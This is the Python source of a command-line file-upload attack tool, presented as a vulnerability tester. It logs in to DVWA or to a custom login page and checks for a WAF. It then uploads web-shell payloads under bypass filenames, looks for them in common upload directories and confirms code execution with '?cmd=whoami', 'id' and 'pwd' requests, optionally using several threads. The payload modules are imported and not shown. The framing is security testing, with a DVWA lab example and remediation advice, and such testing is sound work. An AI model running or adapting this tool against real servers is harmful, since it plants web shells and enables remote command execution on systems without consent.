#!/usr/bin/env python3
"""
File Upload Vulnerability Tester v2.0
Advanced tool for testing file upload vulnerabilities with multiple bypass techniques

Author: Harilal P
GitHub: https://github.com/HariCipher
"""

import argparse
import sys
import os
import requests
from datetime import datetime
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Tuple

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    HAS_COLOR = True
except ImportError:
    HAS_COLOR = False
    # Fallback to no colors
    class Fore:
        RED = GREEN = YELLOW = BLUE = CYAN = MAGENTA = WHITE = RESET = ''
    class Style:
        BRIGHT = RESET_ALL = ''

from modules.bypass_techniques import BypassTechniques
from modules.payload_generator import PayloadGenerator
from modules.session_handler import SessionHandler
from modules.waf_detector import WAFDetector
from modules.reporter import Reporter


class UploadTester:
    """Main vulnerability testing class"""
    
    COMMON_PATHS = [
        "uploads/", "upload/", "files/", "userfiles/", "assets/", 
        "images/", "media/", "content/", "data/", "tmp/", 
        "hackable/uploads/", "vulnerabilities/upload/uploads/"
    ]
    
    def __init__(self, args):
        self.args = args
        self.session = SessionHandler(target_url=self.args.target_url)  
        self.waf_detector = WAFDetector()
        self.reporter = Reporter()
        self.vulnerabilities_found = []
        self.tests_run = 0
        self.successful_uploads = 0
        
        # Colors
        self.c_success = Fore.GREEN + Style.BRIGHT
        self.c_error = Fore.RED + Style.BRIGHT
        self.c_warning = Fore.YELLOW + Style.BRIGHT
        self.c_info = Fore.CYAN
        self.c_header = Fore.MAGENTA + Style.BRIGHT
        
    def print_banner(self):
        """Display tool banner"""
        banner = f"""
{self.c_header}╔═══════════════════════════════════════════════════════════════╗
║  File Upload Vulnerability Tester v2.0                        ║
║  Advanced Security Testing Tool                               ║
║  Author: Harilal P | GitHub: @HariCipher                      ║
╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(banner)
    
    def detect_waf(self):
        """Detect WAF presence"""
        if self.args.skip_waf:
            return
        
        print(f"\n{self.c_info}[*] Detecting WAF...{Style.RESET_ALL}")
        
        # FIX 1: Only pass the URL. The session is already passed when WAFDetector is initialized.
        waf_result = self.waf_detector.detect(self.args.base_url)
        
        # FIX 2: Access properties using dot notation (waf_result.detected) instead of dict notation.
        if waf_result.detected:
            print(f"{self.c_warning}[!] WAF Detected: {waf_result.name} "
                  f"(Confidence: {waf_result.confidence}){Style.RESET_ALL}")
            print(f"{self.c_info}[*] Indicators: {', '.join(waf_result.indicators)}{Style.RESET_ALL}")
            
            if not self.args.ignore_waf:
                print(f"\n{self.c_warning}[!] WAF may block testing. Recommendation:{Style.RESET_ALL}")
                
                # FIX 3: WAFResult has a single 'recommendation' string, not a list method.
                print(f"    • {waf_result.recommendation}")
                
                if not self.args.force:
                    response = input(f"\n{self.c_warning}Continue anyway? (y/N): {Style.RESET_ALL}")
                    if response.lower() != 'y':
                        print(f"{self.c_error}[!] Scan aborted by user{Style.RESET_ALL}")
                        sys.exit(0)
        else:
            print(f"{self.c_success}[✓] No WAF detected{Style.RESET_ALL}")
    
    def authenticate(self):
        """Handle authentication if required"""
        if self.args.dvwa_login:
            print(f"\n{self.c_info}[*] Authenticating to DVWA...{Style.RESET_ALL}")
            
            username = self.args.username or "admin"
            password = self.args.password or "password"
            
            if self.session.login_dvwa(self.args.base_url, username, password):
                print(f"{self.c_success}[✓] Authentication successful{Style.RESET_ALL}")
                
                # Set security level if specified
                if self.args.security_level:
                    if self.session.set_dvwa_security(self.args.base_url, self.args.security_level):
                        print(f"{self.c_success}[✓] Security level set to: {self.args.security_level}{Style.RESET_ALL}")
            else:
                print(f"{self.c_error}[✗] Authentication failed{Style.RESET_ALL}")
                if not self.args.force:
                    sys.exit(1)
        
        elif self.args.custom_login:
            print(f"\n{self.c_info}[*] Custom authentication...{Style.RESET_ALL}")
            # Parse credentials from command line
            creds = {}
            for cred in self.args.credentials.split(','):
                key, val = cred.split('=')
                creds[key.strip()] = val.strip()
            
            if self.session.login_custom(self.args.custom_login, creds, self.args.success_indicator):
                print(f"{self.c_success}[✓] Authentication successful{Style.RESET_ALL}")
            else:
                print(f"{self.c_error}[✗] Authentication failed{Style.RESET_ALL}")
                if not self.args.force:
                    sys.exit(1)
    
    def upload_file(self, file_path: str, filename: str, mime_type: str = None) -> bool:
        """
        Upload a file to target URL
        
        Returns:
            True if upload appeared successful
        """
        try:
            with open(file_path, 'rb') as f:
                files = {self.args.field_name: (filename, f, mime_type or 'application/octet-stream')}
                
                response = self.session.get_session().post(
                    self.args.target_url,
                    files=files,
                    timeout=10
                )
                
                self.tests_run += 1
                
                # Check for success indicators
                if response.status_code == 200:
                    # Look for common success messages
                    success_indicators = [
                        'success', 'uploaded', 'file received', 
                        'upload complete', 'saved'
                    ]
                    
                    response_lower = response.text.lower()
                    if any(indicator in response_lower for indicator in success_indicators):
                        return True
                    
                    # If no error message, assume success
                    error_indicators = ['error', 'failed', 'invalid', 'not allowed']
                    if not any(indicator in response_lower for indicator in error_indicators):
                        return True
                
                return False
                
        except Exception as e:
            if self.args.verbose:
                print(f"{self.c_error}[!] Upload error: {e}{Style.RESET_ALL}")
            return False
    
    def check_file_accessible(self, filename: str) -> Tuple[bool, str, str]:
        """
        Check if uploaded file is accessible
        
        Returns:
            (accessible, url, rce_output)
        """
        for path in self.COMMON_PATHS:
            check_url = urljoin(self.args.base_url, path + filename)
            
            try:
                response = self.session.get_session().get(check_url, timeout=5)
                
                if response.status_code == 200:
                    # File is accessible
                    if self.args.verbose:
                        print(f"{self.c_success}    [✓] File accessible: {check_url}{Style.RESET_ALL}")
                    
                    # Try RCE verification
                    rce_output = self.verify_rce(check_url)
                    
                    return True, check_url, rce_output
                    
            except Exception:
                continue
        
        return False, "", ""
    
    def verify_rce(self, file_url: str) -> str:
        """
        Verify remote code execution
        
        Returns:
            Command output if RCE successful, empty string otherwise
        """
        if not self.args.verify_rce:
            return ""
        
        rce_commands = [
            ('whoami', '?cmd=whoami'),
            ('id', '?cmd=id'),
            ('pwd', '?cmd=pwd'),
        ]
        
        for cmd_name, cmd_param in rce_commands:
            try:
                rce_url = f"{file_url}{cmd_param}"
                response = self.session.get_session().get(rce_url, timeout=5)
                
                if response.status_code == 200 and len(response.text.strip()) > 0:
                    # Check if output looks like command output
                    if len(response.text) < 500:  # Reasonable output size
                        return response.text.strip()
                        
            except Exception:
                continue
        
        return ""
    
    def test_single_variant(self, variant: Tuple[str, str, str], payload_path: str) -> Dict:
        """
        Test a single bypass variant
        
        Args:
            variant: (technique_name, filename, description)
            payload_path: Path to payload file
            
        Returns:
            Dict with test results
        """
        technique, filename, description = variant
        
        result = {
            'technique': technique,
            'filename': filename,
            'description': description,
            'upload_success': False,
            'file_accessible': False,
            'file_url': '',
            'rce_verified': False,
            'rce_output': ''
        }
        
        if self.args.verbose:
            print(f"{self.c_info}  [*] Testing: {technique} - {filename}{Style.RESET_ALL}")
        
        # Try upload
        if self.upload_file(payload_path, filename):
            result['upload_success'] = True
            
            # Check if file is accessible
            accessible, file_url, rce_output = self.check_file_accessible(filename)
            
            if accessible:
                result['file_accessible'] = True
                result['file_url'] = file_url
                result['rce_verified'] = bool(rce_output)
                result['rce_output'] = rce_output
                
                self.successful_uploads += 1
                
                print(f"{self.c_success}[✓] VULNERABLE: {technique}{Style.RESET_ALL}")
                print(f"    Filename: {filename}")
                print(f"    Location: {file_url}")
                if rce_output:
                    print(f"    RCE Output: {rce_output[:100]}")
                
                # Add to vulnerabilities
                vuln_data = {
                    'technique': technique,
                    'filename': filename,
                    'upload_url': self.args.target_url,
                    'file_url': file_url,
                    'rce_verified': bool(rce_output),
                    'rce_output': rce_output
                }
                self.vulnerabilities_found.append(vuln_data)
                self.reporter.add_vulnerability(vuln_data)
        
        return result
    
    def run_scan(self):
        """Execute the main vulnerability scan"""
        start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        print(f"\n{self.c_header}[*] Starting scan against: {self.args.target_url}{Style.RESET_ALL}")
        print(f"{self.c_info}[*] Base URL: {self.args.base_url}{Style.RESET_ALL}")
        
        # Generate payloads
        print(f"\n{self.c_info}[*] Generating payloads...{Style.RESET_ALL}")
        payload_gen = PayloadGenerator()
        payloads = payload_gen.generate_all_payloads()
        print(f"{self.c_success}[✓] Generated {len(payloads)} payload types{Style.RESET_ALL}")
        
        # Select payload to use
        if self.args.payload_type not in payloads:
            print(f"{self.c_error}[!] Invalid payload type. Using 'php'{Style.RESET_ALL}")
            payload_path = payloads['php']
        else:
            payload_path = payloads[self.args.payload_type]
        
        print(f"{self.c_info}[*] Using payload: {os.path.basename(payload_path)}{Style.RESET_ALL}")
        
        # Generate bypass variants
        print(f"\n{self.c_info}[*] Generating bypass techniques...{Style.RESET_ALL}")
        bypass = BypassTechniques(payload_path)
        variants = bypass.generate_variants()
        print(f"{self.c_success}[✓] Generated {len(variants)} test variants{Style.RESET_ALL}")
        
        # Add scan info to reporter
        self.reporter.add_scan_info(self.args.target_url, start_time, len(variants))
        
        # Run tests
        print(f"\n{self.c_header}[*] Running vulnerability tests...{Style.RESET_ALL}")
        print(f"{self.c_info}[*] Threads: {self.args.threads}{Style.RESET_ALL}\n")
        
        if self.args.threads > 1:
            # Multi-threaded testing
            with ThreadPoolExecutor(max_workers=self.args.threads) as executor:
                futures = {
                    executor.submit(self.test_single_variant, variant, payload_path): variant 
                    for variant in variants
                }
                
                for future in as_completed(futures):
                    future.result()  # Get result to catch exceptions
        else:
            # Single-threaded testing
            for variant in variants:
                self.test_single_variant(variant, payload_path)
        
        # Generate summary
        failed_uploads = self.tests_run - self.successful_uploads
        self.reporter.add_summary(self.tests_run, self.successful_uploads, failed_uploads)
        
        # Add recommendations
        if self.successful_uploads > 0:
            self.reporter.add_recommendation(
                "Implement strict file type validation based on file content, not just extension"
            )
            self.reporter.add_recommendation(
                "Store uploaded files outside the web root directory"
            )
            self.reporter.add_recommendation(
                "Use a whitelist of allowed file extensions"
            )
            self.reporter.add_recommendation(
                "Rename uploaded files to random names"
            )
            self.reporter.add_recommendation(
                "Implement proper MIME type checking"
            )
        
        # Print results
        print(f"\n{self.c_header}{'='*60}{Style.RESET_ALL}")
        print(f"{self.c_header}SCAN COMPLETE{Style.RESET_ALL}")
        print(f"{self.c_header}{'='*60}{Style.RESET_ALL}")
        print(f"{self.c_info}Total Tests: {self.tests_run}{Style.RESET_ALL}")
        print(f"{self.c_success}Successful Uploads: {self.successful_uploads}{Style.RESET_ALL}")
        print(f"{self.c_error}Failed Uploads: {failed_uploads}{Style.RESET_ALL}")
        
        if self.successful_uploads > 0:
            print(f"\n{self.c_error}[!] VULNERABILITY FOUND: File upload restriction bypass{Style.RESET_ALL}")
        else:
            print(f"\n{self.c_success}[✓] No vulnerabilities found{Style.RESET_ALL}")
        
        # Generate reports
        if self.args.report:
            print(f"\n{self.c_info}[*] Generating reports...{Style.RESET_ALL}")
            
            json_path = self.reporter.generate_json()
            print(f"{self.c_success}[✓] JSON report: {json_path}{Style.RESET_ALL}")
            
            html_path = self.reporter.generate_html()
            print(f"{self.c_success}[✓] HTML report: {html_path}{Style.RESET_ALL}")
        
        print()
        
    def cleanup(self):
        """Cleanup resources"""
        self.session.close()


def main():
    parser = argparse.ArgumentParser(
        description='File Upload Vulnerability Tester v2.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic scan
  python upload_tester.py http://target.com/upload.php --base http://target.com

  # DVWA scan with authentication
  python upload_tester.py http://localhost/DVWA/vulnerabilities/upload/ \\
    --base http://localhost/DVWA/ --dvwa-login --security-level low

  # Advanced scan with all features
  python upload_tester.py http://target.com/upload.php --base http://target.com \\
    --threads 5 --verify-rce --report --verbose

  # Custom payload type
  python upload_tester.py http://target.com/upload.php --base http://target.com \\
    --payload-type aspx --report
        """
    )
    
    # Required arguments
    parser.add_argument('target_url', help='Upload form URL')
    parser.add_argument('--base', required=True, dest='base_url',
                       help='Base URL for file location checking')
    
    # Authentication
    auth_group = parser.add_argument_group('Authentication')
    auth_group.add_argument('--dvwa-login', action='store_true',
                           help='Login to DVWA before testing')
    auth_group.add_argument('--username', default='admin',
                           help='Username for DVWA login (default: admin)')
    auth_group.add_argument('--password', default='password',
                           help='Password for DVWA login (default: password)')
    auth_group.add_argument('--security-level', choices=['low', 'medium', 'high'],
                           help='DVWA security level to set')
    auth_group.add_argument('--custom-login', metavar='URL',
                           help='Custom login URL for other applications')
    auth_group.add_argument('--credentials', metavar='KEY=VAL,KEY=VAL',
                           help='Credentials for custom login (format: username=admin,password=pass)')
    auth_group.add_argument('--success-indicator', default='logout',
                           help='String indicating successful login (default: logout)')
    
    # Scan options
    scan_group = parser.add_argument_group('Scan Options')
    scan_group.add_argument('--field-name', default='uploaded',
                           help='Upload form field name (default: uploaded)')
    scan_group.add_argument('--payload-type', 
                           choices=['php', 'asp', 'aspx', 'jsp', 'php_poly'],
                           default='php',
                           help='Payload type to use (default: php)')
    scan_group.add_argument('--threads', type=int, default=1,
                           help='Number of concurrent threads (default: 1)')
    scan_group.add_argument('--verify-rce', action='store_true',
                           help='Attempt to verify RCE on uploaded files')
    
    # WAF options
    waf_group = parser.add_argument_group('WAF Options')
    waf_group.add_argument('--skip-waf', action='store_true',
                          help='Skip WAF detection')
    waf_group.add_argument('--ignore-waf', action='store_true',
                          help='Ignore WAF detection results')
    
    # Output options
    output_group = parser.add_argument_group('Output Options')
    output_group.add_argument('--report', action='store_true',
                             help='Generate JSON and HTML reports')
    output_group.add_argument('--verbose', '-v', action='store_true',
                             help='Verbose output')
    output_group.add_argument('--force', action='store_true',
                             help='Force scan even if warnings occur')
    
    args = parser.parse_args()
    
    # Initialize tester
    tester = UploadTester(args)
    
    try:
        # Print banner
        tester.print_banner()
        
        # Detect WAF
        tester.detect_waf()
        
        # Authenticate if needed
        tester.authenticate()
        
        # Run the scan
        tester.run_scan()
        
    except KeyboardInterrupt:
        print(f"\n{tester.c_error}[!] Scan interrupted by user{Style.RESET_ALL}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{tester.c_error}[!] Error: {e}{Style.RESET_ALL}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)
    finally:
        tester.cleanup()


if __name__ == '__main__':
    main()
